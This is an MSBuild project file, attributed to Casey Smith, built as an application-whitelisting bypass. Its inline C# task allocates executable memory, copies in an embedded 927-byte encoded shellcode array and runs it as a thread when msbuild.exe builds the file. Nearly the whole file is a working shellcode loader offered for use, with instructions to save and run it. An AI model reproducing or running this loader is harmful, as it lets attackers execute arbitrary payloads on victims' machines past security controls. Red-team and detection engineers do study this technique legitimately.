<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[927] { 0xba,0x48,0x4a,0xd9,0xba,0xdd,0xc7,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0xe2,0x31,0x50,0x12,0x03,0x50,0x12,0x83,0x88,0x4e,0x3b,0x4f,0xd2,0x87,0x62,0xc4,0xc6,0xe3,0x2d,0x00,0x34,0x7b,0xe7,0x10,0x09,0x4a,0x46,0x7d,0x58,0x0f,0xb1,0x01,0x71,0x73,0xc2,0x46,0xb4,0x5c,0x47,0x38,0x67,0xf7,0x4a,0x39,0x7a,0x92,0x4e,0xcb,0x5d,0x75,0xbe,0xe1,0xb5,0xdc,0xe4,0x58,0x47,0x15,0xc9,0x6d,0x80,0x93,0x80,0x51,0x64,0x22,0xb7,0x76,0x88,0x0a,0xcc,0x87,0x61,0xcc,0x65,0x35,0x91,0xd8,0x8a,0x3a,0xe3,0x7f,0xf5,0xfe,0x86,0x23,0x6f,0xc2,0x55,0x1d,0xc9,0xa6,0x1b,0xcb,0x70,0xb0,0xfe,0x7a,0x90,0x13,0x35,0x1c,0x09,0x42,0x29,0xda,0xef,0x5c,0x16,0xa9,0x22,0xc0,0x47,0x49,0x4c,0xdd,0xe1,0x0f,0x5e,0x00,0x64,0x7b,0xef,0xd5,0x57,0x4c,0xa2,0xb3,0x66,0x08,0x16,0xe5,0x6d,0x88,0x20,0x58,0xcf,0x56,0xa1,0x66,0x3b,0x46,0xf5,0x74,0x1e,0x60,0x99,0x2c,0x27,0xb6,0x80,0x7e,0x2f,0xb2,0x0b,0xcb,0x0d,0x29,0x04,0x9e,0xdf,0x8e,0x0d,0xf7,0x9e,0xd4,0x44,0xf4,0xf7,0x60,0x77,0x71,0x33,0x2c,0x98,0xab,0x4b,0xd1,0x67,0x34,0x78,0xa0,0x8c,0x19,0xf7,0x10,0x68,0xa3,0x00,0xd1,0xfc,0x2f,0xd8,0x42,0x01,0x2e,0xc1,0xc5,0x51,0xbf,0xd2,0x2d,0x89,0x20,0xeb,0x3b,0x6d,0x50,0x74,0x23,0x03,0xdf,0xfa,0x1f,0x2d,0x41,0x15,0x7a,0x72,0x13,0x21,0x00,0x15,0x1d,0x21,0x8c,0x1d,0x42,0xdc,0x46,0x54,0x30,0x4d,0x28,0xee,0x11,0xe6,0x01,0x3c,0x8a,0xfc,0xe7,0x86,0x85,0x95,0xdb,0x1e,0x29,0x7d,0xee,0x17,0xc3,0x21,0x59,0x16,0x58,0xac,0x11,0xb8,0xdc,0x1f,0x37,0xa7,0x31,0x36,0x18,0xf3,0x2d,0xd2,0xf6,0xaf,0x1e,0x93,0x4f,0x61,0x35,0x54,0x95,0x1a,0xe3,0xd4,0xaf,0xb9,0xbf,0xcd,0x9f,0x67,0xb4,0x01,0xba,0x74,0x91,0xda,0xf3,0x37,0xc6,0x07,0xa0,0x45,0xa0,0xef,0x76,0x8f,0x9d,0x85,0xb6,0xfb,0x37,0xd6,0x57,0x08,0xbd,0x3d,0x6a,0x23,0x08,0x31,0x7e,0x97,0xe9,0x67,0x60,0xf6,0xdd,0xef,0x6d,0xbf,0xa6,0xe7,0x3e,0xff,0x48,0xef,0xc8,0xb7,0xc0,0xa5,0x39,0xa6,0x47,0x44,0x73,0x0a,0xb0,0x7c,0x5b,0x09,0xa0,0xd1,0xce,0x36,0xcf,0x3c,0xc7,0x27,0x49,0x9a,0x1b,0xcd,0xcc,0xbe,0x46,0x90,0x9a,0x34,0xe9,0xe9,0xb2,0xd2,0xd2,0x4e,0xd1,0x35,0xad,0xf0,0x56,0x85,0x55,0xee,0x78,0xa8,0x62,0xa4,0x85,0x76,0xaf,0xd9,0x80,0x58,0xc9,0xf7,0xad,0xd1,0xdd,0x4b,0x76,0x96,0xfb,0xe5,0x76,0xad,0x93,0xae,0x80,0x43,0xcb,0x96,0xda,0xe2,0xb4,0xde,0x56,0x47,0x36,0x36,0xc1,0xa1,0xe9,0x78,0xb5,0x37,0x1d,0xcd,0xa4,0x8d,0x47,0x4a,0x4c,0x35,0x6b,0xdd,0x94,0x8c,0x08,0xc7,0x3a,0x28,0xd9,0x92,0x9e,0x0f,0x2d,0x7c,0x4a,0xb3,0xa0,0x2e,0x56,0x27,0xf0,0xec,0x0a,0xd8,0x74,0xae,0xa1,0x38,0x5f,0x1b,0xd7,0x85,0xc0,0x7d,0xd5,0xe9,0x13,0x92,0xdc,0x5f,0xec,0xda,0xe0,0xe7,0xde,0x97,0xa7,0xd5,0x4d,0x8c,0xf5,0x44,0x22,0x64,0x75,0x2e,0xbf,0xd8,0x39,0x14,0x77,0xf2,0xd5,0x6b,0xbc,0x67,0xdd,0xd6,0xf2,0x4f,0x57,0xeb,0x1c,0xc0,0x24,0x6f,0xeb,0xaf,0x64,0x1d,0x7e,0x3b,0x40,0xa7,0x31,0xaf,0x85,0x97,0xb5,0x02,0x2c,0xe7,0x96,0xf9,0xf4,0xc7,0x1c,0xd7,0x51,0xda,0x45,0x35,0x69,0x18,0x61,0xd6,0xae,0x24,0x0b,0xbc,0x1d,0xbd,0x77,0xe7,0xfb,0x8a,0x7f,0xea,0x5b,0x89,0x4e,0x66,0x5b,0x91,0x24,0x24,0x36,0x69,0x31,0x21,0x41,0x6a,0x66,0xb5,0x1a,0x7e,0x23,0x0b,0xc2,0x1b,0x2c,0xf7,0xc6,0x87,0xb7,0xe9,0x3a,0xf4,0x0c,0x3b,0x22,0xc9,0xda,0x04,0xf7,0x09,0x76,0x8a,0x9f,0xd6,0xcc,0xd7,0x66,0x83,0xc2,0x7b,0x3b,0xfa,0xa9,0x04,0xa2,0xc9,0x5c,0x85,0x35,0x91,0xb7,0xd4,0x12,0x08,0xaf,0x26,0x41,0xbd,0x81,0x46,0xab,0xb6,0xa4,0xd5,0x35,0x7f,0x6e,0xd3,0x09,0xb1,0x6e,0xd8,0xc7,0x77,0xa5,0x20,0x0b,0x87,0xf6,0xf7,0x43,0xf4,0x3f,0x35,0x6e,0xf8,0x85,0xbf,0xfd,0xaf,0xc4,0xda,0xcd,0x36,0x8e,0x6e,0xec,0x3a,0x4e,0xc0,0x8a,0x66,0xae,0xdf,0x0e,0xc1,0xc6,0x4c,0x26,0x70,0xe6,0x8a,0x81,0x67,0x32,0x0d,0xfa,0xef,0xce,0xe8,0x56,0x48,0x69,0xe5,0x54,0x1c,0xdc,0x59,0xf6,0x0d,0xb5,0x03,0xe6,0xec,0x8b,0x15,0x65,0x28,0x92,0x4c,0xcb,0xdc,0x6c,0x4a,0x9f,0xc9,0x26,0xeb,0x6f,0x54,0xf0,0xd9,0xa8,0x76,0x9a,0xff,0xee,0xbd,0xd3,0xd8,0x10,0xb9,0x78,0x25,0xab,0x97,0x34,0x9c,0xa3,0x28,0xce,0xee,0xfa,0x3b,0x77,0x9d,0xa7,0x67,0xf7,0xcb,0xa9,0x76,0x9f,0xd2,0x72,0x4c,0xfd,0x9c,0x1c,0x0a,0x49,0xee,0x7f,0xcc,0xae,0x2a,0xff,0xa8,0x20,0xf0,0x07,0x22,0xf9,0x79,0x0b,0xb4,0xde,0x68,0x09,0x50,0x73,0xe0,0x28,0xf4,0x76,0xee,0x4a,0x20,0x67,0x22,0xad,0x6f,0xd6,0x15,0xb0,0x2f,0x90,0xc0,0x97,0xd7,0xde,0x7d,0x82,0xba,0x7e,0x18,0x09,0xa1,0x71,0x83,0x21,0x33,0xf8,0xe6,0xa1,0x5d,0xc5,0x19,0xf4,0x6c,0xcb,0xe4,0x9c,0x42,0x60,0x71,0x1f,0x7f,0xb2,0x71,0x1d,0x06,0xbc,0xb3,0xd3,0xf3,0x16,0xa5,0x5f,0x14,0x4b,0xf2,0xa0,0xd2,0xb7,0xf7,0x91,0xa6,0x7a,0xa5,0xff,0x8f,0x87,0x3d,0x49,0x90,0xf1,0x68,0x40,0x97,0xb4,0xe9,0x23,0x38,0x66,0x4c,0x7f,0xdf,0x8e,0x1d,0x63,0x49,0xbc,0x45,0xef,0xbd,0x8f,0xde,0x48,0x26,0xa6,0x82,0x9f,0xac,0xd9,0x24,0x16,0x6a,0x05,0xef,0xca,0xb6,0x98,0xb4,0x68,0x44,0xc9,0x8c,0x8d,0x7d,0x03,0x24,0x34,0xcc,0xdf,0x6c,0xe0,0x28,0x07,0x4a,0x69,0x32,0x1f,0xff,0xa9,0xd9,0x9c,0xf0,0xab,0x28,0xa8,0x38,0x73,0xe4,0x55,0x67,0x66 };
			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>